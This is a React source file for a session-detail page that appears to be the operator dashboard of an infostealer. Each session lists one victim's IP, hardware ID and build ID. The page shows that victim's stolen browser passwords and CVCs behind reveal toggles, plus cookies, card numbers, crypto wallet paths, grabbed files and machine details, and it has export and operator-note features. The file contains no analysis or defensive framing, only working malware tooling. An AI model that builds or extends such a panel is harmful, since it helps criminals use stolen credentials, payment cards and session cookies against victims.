import { useState } from 'react'
import { useParams, useNavigate } from 'react-router-dom'
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import { formatDistanceToNow } from 'date-fns'
import { ArrowLeft, Eye, EyeOff, Key, Cookie, CreditCard, Wallet, FileText, Monitor, Server, Download, Trash2, MessageSquare } from 'lucide-react'
import { api } from '@/lib/api'
import { t } from '@/lib/i18n'
import { Button } from '@/components/ui/button'
import { Skeleton } from '@/components/ui/skeleton'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import {
  DropdownMenu,
  DropdownMenuTrigger,
  DropdownMenuContent,
  DropdownMenuItem,
} from '@/components/ui/dropdown-menu'
import { FlagIcon } from '@/components/charts/flag-icon'
import type { SessionDetail, Note } from '@/types'

function formatBytes(bytes?: number): string {
  if (!bytes || bytes === 0) return '0 B'
  const k = 1024
  const sizes = ['B', 'KB', 'MB', 'GB']
  const i = Math.floor(Math.log(bytes) / Math.log(k))
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(1))} ${sizes[i]}`
}

export default function SessionDetail() {
  const { id } = useParams()
  const navigate = useNavigate()
  const [revealed, setRevealed] = useState<Set<string>>(new Set())

  const query = useQuery<SessionDetail>({
    queryKey: ['session', id],
    queryFn: () => api.get<SessionDetail>(`/api/sessions/${id}`),
    enabled: !!id,
  })

  const queryClient = useQueryClient()
  const [newNote, setNewNote] = useState('')

  const notesQuery = useQuery<Note[]>({
    queryKey: ['notes', id],
    queryFn: () => api.get<Note[]>(`/api/sessions/${id}/notes`),
    enabled: !!id,
  })

  const addNoteMutation = useMutation({
    mutationFn: (content: string) => api.post(`/api/sessions/${id}/notes`, { content }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['notes', id] })
      setNewNote('')
    },
  })

  const deleteNoteMutation = useMutation({
    mutationFn: (noteId: string) => api.del(`/api/notes/${noteId}`),
    onSuccess: () => queryClient.invalidateQueries({ queryKey: ['notes', id] }),
  })

  const toggleReveal = (id: string) => {
    setRevealed(prev => {
      const next = new Set(prev)
      if (next.has(id)) next.delete(id)
      else next.add(id)
      return next
    })
  }

  if (query.isLoading) {
    return (
      <div className="space-y-6">
        <Skeleton className="h-8 w-48" />
        <Skeleton className="h-4 w-96" />
        <div className="space-y-2">
          <Skeleton className="h-10 w-full" />
          <Skeleton className="h-64 w-full" />
        </div>
      </div>
    )
  }

  if (!query.data) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[60vh] text-muted-foreground gap-4">
        <p className="text-lg font-medium">Session not found</p>
        <Button variant="outline" onClick={() => navigate('/sessions')}>
          Back to Sessions
        </Button>
      </div>
    )
  }

  const session = query.data

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <Button variant="ghost" onClick={() => navigate('/sessions')}>
            <ArrowLeft className="h-4 w-4 mr-1" />
            Sessions
          </Button>
          <DropdownMenu>
            <DropdownMenuTrigger asChild>
              <Button variant="outline" size="sm">
                <Download className="h-4 w-4 mr-2" />
                Export
              </Button>
            </DropdownMenuTrigger>
            <DropdownMenuContent>
              <DropdownMenuItem onClick={() => window.open(`/api/export/session/${id}?format=json`)}>
                Export as JSON
              </DropdownMenuItem>
              <DropdownMenuItem onClick={() => window.open(`/api/export/session/${id}?format=html`)}>
                Export as HTML
              </DropdownMenuItem>
            </DropdownMenuContent>
          </DropdownMenu>
        </div>
      </div>

      <div className="flex items-center gap-3">
        <h1 className="text-2xl font-bold font-mono">{session.ip}</h1>
        <FlagIcon country={session.country_code ?? ''} width={24} height={24} />
        <span className="text-sm text-muted-foreground font-mono">{session.country_code}</span>
      </div>

      <div className="flex flex-wrap gap-3 text-sm text-muted-foreground">
        <span>HWID: <span className="font-mono text-foreground">{session.hwid ?? '-'}</span></span>
        <span>OS: <span className="font-mono text-foreground">{session.os ?? '-'}</span></span>
        <span>Username: <span className="font-mono text-foreground">{session.username ?? '-'}</span></span>
        <span>Build: <span className="font-mono text-foreground">{session.build_id ?? '-'}</span></span>
        <span>Created: <span className="font-mono text-foreground">{formatDistanceToNow(new Date(session.created_at), { addSuffix: true })}</span></span>
      </div>

      <Tabs defaultValue="passwords">
        <TabsList className="w-full justify-start">
          <TabsTrigger value="passwords">
            <Key className="h-4 w-4 mr-1" />
            {t("session.passwords")} ({session.passwords?.length ?? 0})
          </TabsTrigger>
          <TabsTrigger value="cookies">
            <Cookie className="h-4 w-4 mr-1" />
            {t("session.cookies")} ({session.cookies?.length ?? 0})
          </TabsTrigger>
          <TabsTrigger value="cards">
            <CreditCard className="h-4 w-4 mr-1" />
            {t("session.cards")} ({session.cards?.length ?? 0})
          </TabsTrigger>
          <TabsTrigger value="wallets">
            <Wallet className="h-4 w-4 mr-1" />
            {t("session.wallets")} ({session.wallets?.length ?? 0})
          </TabsTrigger>
          <TabsTrigger value="files">
            <FileText className="h-4 w-4 mr-1" />
            {t("session.files")} ({session.files?.length ?? 0})
          </TabsTrigger>
          <TabsTrigger value="system">
            <Monitor className="h-4 w-4 mr-1" />
            System Info
          </TabsTrigger>
          <TabsTrigger value="notes">
            <MessageSquare className="h-4 w-4 mr-1" />
            Notes
          </TabsTrigger>
        </TabsList>

        <TabsContent value="passwords">
          <Card>
            <CardContent className="p-0">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="w-8">#</TableHead>
                    <TableHead>URL</TableHead>
                    <TableHead>Username</TableHead>
                    <TableHead>Password</TableHead>
                    <TableHead>Browser</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {session.passwords?.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={5} className="h-24 text-center text-muted-foreground">
                        No passwords found
                      </TableCell>
                    </TableRow>
                  ) : (
                    session.passwords?.map((pwd, i) => (
                      <TableRow key={pwd.id}>
                        <TableCell className="text-muted-foreground text-xs">{i + 1}</TableCell>
                        <TableCell className="max-w-xs truncate font-mono text-xs">{pwd.url ?? '-'}</TableCell>
                        <TableCell className="font-mono text-xs">{pwd.username ?? '-'}</TableCell>
                        <TableCell className="font-mono text-xs">
                          <div className="flex items-center gap-2">
                            <span className="font-mono">
                              {revealed.has(pwd.id) ? (pwd.password_value ?? '') : '••••••••'}
                            </span>
                            <button
                              onClick={() => toggleReveal(pwd.id)}
                              className="text-muted-foreground hover:text-foreground"
                            >
                              {revealed.has(pwd.id) ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
                            </button>
                          </div>
                        </TableCell>
                        <TableCell className="text-xs">{pwd.browser ?? '-'}</TableCell>
                      </TableRow>
                    ))
                  )}
                </TableBody>
              </Table>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="cookies">
          <Card>
            <CardContent className="p-0">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="w-8">#</TableHead>
                    <TableHead>Domain</TableHead>
                    <TableHead>Name</TableHead>
                    <TableHead>Value</TableHead>
                    <TableHead>Path</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {session.cookies?.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={5} className="h-24 text-center text-muted-foreground">
                        No cookies found
                      </TableCell>
                    </TableRow>
                  ) : (
                    session.cookies?.map((ck, i) => (
                      <TableRow key={ck.id}>
                        <TableCell className="text-muted-foreground text-xs">{i + 1}</TableCell>
                        <TableCell className="font-mono text-xs">{ck.domain ?? '-'}</TableCell>
                        <TableCell className="font-mono text-xs max-w-[200px] truncate">{ck.name ?? '-'}</TableCell>
                        <TableCell className="font-mono text-xs max-w-[300px] truncate">{ck.value ?? '-'}</TableCell>
                        <TableCell className="font-mono text-xs">{ck.path ?? '-'}</TableCell>
                      </TableRow>
                    ))
                  )}
                </TableBody>
              </Table>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="cards">
          <Card>
            <CardContent className="p-0">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="w-8">#</TableHead>
                    <TableHead>Number</TableHead>
                    <TableHead>Expires</TableHead>
                    <TableHead>Holder</TableHead>
                    <TableHead>CVC</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {session.cards?.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={5} className="h-24 text-center text-muted-foreground">
                        No cards found
                      </TableCell>
                    </TableRow>
                  ) : (
                    session.cards?.map((cd, i) => (
                      <TableRow key={cd.id}>
                        <TableCell className="text-muted-foreground text-xs">{i + 1}</TableCell>
                        <TableCell className="font-mono text-xs">{cd.number ? `•••• •••• •••• ${cd.number.slice(-4)}` : '-'}</TableCell>
                        <TableCell className="text-xs">{cd.exp_month && cd.exp_year ? `${cd.exp_month}/${cd.exp_year}` : '-'}</TableCell>
                         <TableCell className="text-xs">{cd.holder ?? '-'}</TableCell>
                         <TableCell className="font-mono text-xs">
                           {cd.cvc ? (
                             <button
                               onClick={() => setRevealed(prev => {
                                 const next = new Set(prev)
                                 next.has(`cvc-${cd.id}`) ? next.delete(`cvc-${cd.id}`) : next.add(`cvc-${cd.id}`)
                                 return next
                               })}
                               className="inline-flex items-center gap-1 hover:text-foreground"
                             >
                               {revealed.has(`cvc-${cd.id}`) ? cd.cvc : '•••'}
                               {revealed.has(`cvc-${cd.id}`) ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
                             </button>
                           ) : '-'}
                         </TableCell>
                      </TableRow>
                    ))
                  )}
                </TableBody>
              </Table>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="wallets">
          <Card>
            <CardContent className="p-0">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="w-8">#</TableHead>
                    <TableHead>Name</TableHead>
                    <TableHead>Path</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {session.wallets?.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={3} className="h-24 text-center text-muted-foreground">
                        No wallets found
                      </TableCell>
                    </TableRow>
                  ) : (
                    session.wallets?.map((w, i) => (
                      <TableRow key={w.id}>
                        <TableCell className="text-muted-foreground text-xs">{i + 1}</TableCell>
                        <TableCell className="text-xs">{w.name ?? '-'}</TableCell>
                        <TableCell className="font-mono text-xs">{w.path ?? '-'}</TableCell>
                      </TableRow>
                    ))
                  )}
                </TableBody>
              </Table>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="files">
          <Card>
            <CardContent className="p-0">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="w-8">#</TableHead>
                    <TableHead>Filename</TableHead>
                    <TableHead className="text-right">Size</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {session.files?.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={3} className="h-24 text-center text-muted-foreground">
                        No files found
                      </TableCell>
                    </TableRow>
                  ) : (
                    session.files?.map((f, i) => (
                      <TableRow key={f.id}>
                        <TableCell className="text-muted-foreground text-xs">{i + 1}</TableCell>
                        <TableCell className="font-mono text-xs">{f.filename ?? '-'}</TableCell>
                        <TableCell className="text-right tabular-nums text-xs">{formatBytes(f.size)}</TableCell>
                      </TableRow>
                    ))
                  )}
                </TableBody>
              </Table>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="system">
          <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
            {session.system_info ? (
              <>
                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">CPU</CardTitle>
                    <Server className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <p className="text-sm font-mono">{session.system_info.cpu ?? '-'}</p>
                  </CardContent>
                </Card>
                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">GPU</CardTitle>
                    <Monitor className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <p className="text-sm font-mono">{session.system_info.gpu ?? '-'}</p>
                  </CardContent>
                </Card>
                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">RAM</CardTitle>
                    <Server className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <p className="text-sm font-mono">{session.system_info.ram ?? '-'}</p>
                  </CardContent>
                </Card>
                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">Operating System</CardTitle>
                    <Monitor className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <p className="text-sm font-mono">{session.system_info.os ?? '-'}</p>
                  </CardContent>
                </Card>
                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">Screen</CardTitle>
                    <Monitor className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <p className="text-sm font-mono">{session.system_info.screen ?? '-'}</p>
                  </CardContent>
                </Card>
                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">Hostname</CardTitle>
                    <Server className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <p className="text-sm font-mono">{session.system_info.hostname ?? '-'}</p>
                  </CardContent>
                </Card>
                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">Local IP</CardTitle>
                    <Server className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <p className="text-sm font-mono">{session.system_info.local_ip ?? '-'}</p>
                  </CardContent>
                </Card>
                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">MAC Address</CardTitle>
                    <Server className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <p className="text-sm font-mono">{session.system_info.mac ?? '-'}</p>
                  </CardContent>
                </Card>
              </>
            ) : (
              <div className="col-span-full text-center text-muted-foreground py-8">
                No system information available
              </div>
            )}
          </div>
        </TabsContent>

        <TabsContent value="notes">
          <Card>
            <CardContent className="space-y-4 pt-6">
              <div className="flex gap-2">
                <textarea
                  className="flex min-h-[80px] w-full rounded-md border border-input bg-transparent px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2"
                  placeholder="Add a note..."
                  value={newNote}
                  onChange={e => setNewNote(e.target.value)}
                />
                <Button
                  className="self-end"
                  size="sm"
                  onClick={() => addNoteMutation.mutate(newNote)}
                  disabled={!newNote.trim() || addNoteMutation.isPending}
                >
                  Add Note
                </Button>
              </div>

              {notesQuery.isLoading ? (
                <div className="space-y-2">
                  <Skeleton className="h-16 w-full" />
                  <Skeleton className="h-16 w-full" />
                </div>
              ) : notesQuery.data?.length === 0 ? (
                <p className="text-center text-muted-foreground py-4">No notes yet</p>
              ) : (
                <div className="space-y-2">
                  {notesQuery.data?.map(note => (
                    <div key={note.id} className="flex items-start justify-between rounded-md border p-3">
                      <div className="space-y-1 flex-1 min-w-0">
                        <p className="text-sm whitespace-pre-wrap break-words">{note.content}</p>
                        <p className="text-xs text-muted-foreground">
                          {note.created_by} &middot; {formatDistanceToNow(new Date(note.created_at), { addSuffix: true })}
                        </p>
                      </div>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="ml-2 shrink-0"
                        onClick={() => deleteNoteMutation.mutate(note.id)}
                        disabled={deleteNoteMutation.isPending}
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  )
}
